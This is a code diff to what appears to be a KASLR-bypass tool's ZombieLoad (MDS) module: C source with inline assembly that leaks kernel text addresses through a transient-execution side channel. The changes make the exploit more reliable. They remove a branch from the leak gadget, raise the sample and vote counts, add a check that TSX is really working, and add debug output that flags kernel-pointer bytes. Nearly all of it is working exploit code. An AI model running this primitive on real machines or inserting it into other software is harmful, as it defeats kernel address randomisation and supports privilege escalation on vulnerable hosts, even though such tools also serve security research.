@@ -49,8 +49,20 @@
 //   privilege transition. Enabled by default when CPU microcode supports it.
 //   Hardware fix in Intel Ice Lake and later (gen 10+).
 //   TSX disabled (tsx=off, microcode, or CONFIG_X86_INTEL_TSX_MODE_OFF)
-//   prevents the TSX-based attack.
+//   prevents the TSX-based attack. Post-2019 Intel microcode for
+//   Skylake/Kaby Lake disables RTM at runtime on most SKUs even when the
+//   CPUID RTM bit remains set.
 //   AMD CPUs are not vulnerable to MDS.
+//
+// Caveats:
+//   Even on unmitigated hardware with no kernel MDS mitigations and
+//   pre-MDS microcode, this specific primitive (PROT_NONE load inside
+//   RTM, Flush+Reload encoding) has been observed to produce noise-floor
+//   results on some Skylake-H steppings — the transient window appears
+//   to close before the encoding load issues an address-dependent cache
+//   fill. The TAA variant (async abort via sibling-thread cache conflict)
+//   is typically more reliable on the same hardware but is not
+//   implemented here.
 //
 // References:
 // https://zombieloadattack.com/
@@ -90,9 +102,9 @@
  */
 
 /* Number of MDS samples per cache-line offset. Higher values improve
- * statistical confidence but increase runtime. At 2000 samples with
- * ~13 us per sample: 64 offsets x 2000 = 128,000 iterations ~ 1.7 s. */
-#define MDS_SAMPLES 2000
+ * statistical confidence but increase runtime. At 5000 samples with
+ * ~13 us per sample: 64 offsets x 5000 = 320,000 iterations ~ 4.2 s. */
+#define MDS_SAMPLES 5000
 
 /* Minimum hit count for a byte value to be considered signal (not noise).
  * Values appearing in fewer than MDS_MIN_HITS samples are ignored. */
@@ -100,7 +112,7 @@
 
 /* Number of independent sampling runs. Each produces a candidate address;
  * the result that appears in a majority of runs is reported. */
-#define MDS_RUNS 3
+#define MDS_RUNS 5
 
 KASLD_EXPLAIN(
     "ZombieLoad exploits Microarchitectural Data Sampling (MDS) in Intel "
@@ -171,6 +183,36 @@ static void *fault_page;
 
 static int histograms[64][256];
 
+static int debug_mode;
+static int total_probe_hits; /* probe accesses across all runs; 0 = no transient
+                                LFB data */
+
+/* Dump per-offset histogram peaks to stderr.
+ * Each row shows 8 offsets: value:count for signal, --:count for noise.
+ * 0xff values are flagged with '*' — they are the upper-byte signature of
+ * kernel text pointers (0xFFFFFFFF8xxxxxxx). Set KASLD_ZOMBIELOAD_DEBUG=1. */
+static void dump_histograms(int run) {
+  fprintf(stderr, "[debug] run %d: per-offset peaks (signal = >=%d hits):\n",
+          run + 1, MDS_MIN_HITS);
+  for (int off = 0; off < 64; off++) {
+    int pv = 0, pc = 0;
+    for (int v = 1; v < 256; v++) {
+      if (histograms[off][v] > pc) {
+        pc = histograms[off][v];
+        pv = v;
+      }
+    }
+    if (off % 8 == 0)
+      fprintf(stderr, "  [%2d]:", off);
+    if (pc >= MDS_MIN_HITS)
+      fprintf(stderr, " %02x:%-4d%c", pv, pc, pv == 0xff ? '*' : ' ');
+    else
+      fprintf(stderr, " --:%-4d ", pc);
+    if (off % 8 == 7)
+      fprintf(stderr, "\n");
+  }
+}
+
 /* =========================================================================
  * MDS sample primitive
  *
@@ -192,19 +234,23 @@ static void mds_sample_at(int off) {
 
   /* MDS primitive: faulting load from non-present page within TSX.
    *
-   * The movzbl loads one byte from fault_page + off. Because the page
-   * has PROT_NONE, this faults. During the transient window before the
-   * TSX abort, the CPU may forward stale LFB data as the load result.
+   * The first movzbl loads one byte from fault_page + off. Because the
+   * page has PROT_NONE, this faults. During the transient window before
+   * the TSX abort, the CPU may forward stale LFB data as the load result.
+   * The leaked byte is shifted left by 12 (× 4096) and used to index a
+   * unique page in the probe array; whichever probe page gets cached
+   * during the transient window reveals the leaked value to the
+   * post-abort Flush+Reload phase.
    *
-   * The leaked byte is shifted left by 12 (× 4096) to index a unique
-   * page in the probe array. The jz skips zero — the most common noise
-   * value — to avoid polluting the histogram. */
+   * Pure data-dependency chain with no control flow: a conditional branch
+   * inside the transient window interacts with branch prediction and can
+   * narrow the speculation window on some microcode revisions. Zero leaks
+   * are tolerated by encoding into probe[0] and skipping probe[0] during
+   * reload. */
   if (xbegin_wrapper() == ~0u) {
     __asm__ volatile("movzbl (%[fp]), %%eax\n\t"
                      "shl $12, %%rax\n\t"
-                     "jz 1f\n\t"
                      "movzbl (%[pr], %%rax, 1), %%eax\n\t"
-                     "1:"
                      :
                      : [fp] "r"((char *)fault_page + off), [pr] "r"(probe)
                      : "rax", "memory");
@@ -212,10 +258,12 @@ static void mds_sample_at(int off) {
   }
 
   /* Reload: find which probe line was cached (at most one per sample).
-   * Start at 1 — zero is skipped in the encoding above. */
+   * Start at 1 — probe[0] is the bucket for zero leaks (noise floor)
+   * and is intentionally discarded. */
   for (int i = 1; i < 256; i++) {
     if (flush_reload(probe + i * 4096)) {
       histograms[off][i]++;
+      total_probe_hits++;
       break;
     }
   }
@@ -321,8 +369,15 @@ int main(void) {
   }
 
   if (!has_rtm()) {
-    fprintf(stderr, "[-] zombieload: TSX/RTM not available; "
+    fprintf(stderr, "[-] zombieload: TSX/RTM not available (CPUID); "
                     "required for MDS fault suppression\n");
+    return KASLD_EXIT_UNAVAILABLE;
+  }
+
+  if (!rtm_is_functional()) {
+    fprintf(stderr, "[-] zombieload: TSX/RTM disabled at runtime; "
+                    "CPUID reports RTM but transactions abort immediately "
+                    "(microcode update or hypervisor restriction)\n");
     return KASLD_EXIT_UNAVAILABLE;
   }
 
@@ -338,6 +393,8 @@ int main(void) {
     fprintf(stderr, "[.] zombieload: MDS mitigations not active; "
                     "CPU may be vulnerable\n");
   }
+
+  debug_mode = getenv("KASLD_ZOMBIELOAD_DEBUG") != NULL;
 
   fprintf(stderr, "[.] zombieload: using TSX abort mode\n");
 
@@ -371,6 +428,14 @@ int main(void) {
     }
 
     results[run] = analyze_histograms();
+    if (debug_mode) {
+      dump_histograms(run);
+      if (results[run])
+        fprintf(stderr, "[debug] run %d: candidate 0x%016lx\n", run + 1,
+                results[run]);
+      else
+        fprintf(stderr, "[debug] run %d: no candidate found\n", run + 1);
+    }
   }
 
   /* Majority vote: select the address that appears most often */
@@ -390,7 +455,45 @@ int main(void) {
     }
   }
 
+  if (debug_mode) {
+    fprintf(stderr, "[debug] total probe hits across all runs: %d\n",
+            total_probe_hits);
+    fprintf(stderr, "[debug] votes:");
+    for (int i = 0; i < MDS_RUNS; i++) {
+      if (results[i])
+        fprintf(stderr, " [%d]=0x%lx", i + 1, results[i]);
+      else
+        fprintf(stderr, " [%d]=none", i + 1);
+    }
+    fprintf(stderr, "\n");
+  }
+
   munmap(fault_page, 4096);
+
+  if (total_probe_hits == 0) {
+    fprintf(stderr,
+            "[-] zombieload: no transient execution reached the probe "
+            "array across %d runs; the faulting load inside TSX is aborting "
+            "the transaction before any transient forwarding occurs "
+            "(hypervisor intercept, TSX not truly entering transactional "
+            "mode, or hardware-specific behaviour)\n",
+            MDS_RUNS);
+    return KASLD_EXIT_UNAVAILABLE;
+  }
+
+  if (total_probe_hits < MDS_MIN_HITS) {
+    fprintf(stderr,
+            "[-] zombieload: transient leak chain is not producing "
+            "address-dependent cache fills (%d probe hits across %d runs, "
+            "scattered across offsets; %d required per offset for signal). "
+            "Transient execution appears to be happening but the leaked "
+            "byte is not propagating through the encoding load — CPU may "
+            "be silently hardened against this MDS variant despite being "
+            "reported vulnerable, or the transient window is too narrow "
+            "on this microcode revision\n",
+            total_probe_hits, MDS_RUNS, MDS_MIN_HITS);
+    return KASLD_EXIT_UNAVAILABLE;
+  }
 
   if (!addr) {
     if (mds_status == 1)
@@ -398,7 +501,7 @@ int main(void) {
                       "(MDS mitigations likely effective)\n");
     else
       fprintf(stderr, "[-] zombieload: no kernel address found "
-                      "(CPU may not be vulnerable)\n");
+                      "(signal present but no kernel text pattern detected)\n");
     return 0;
   }
 
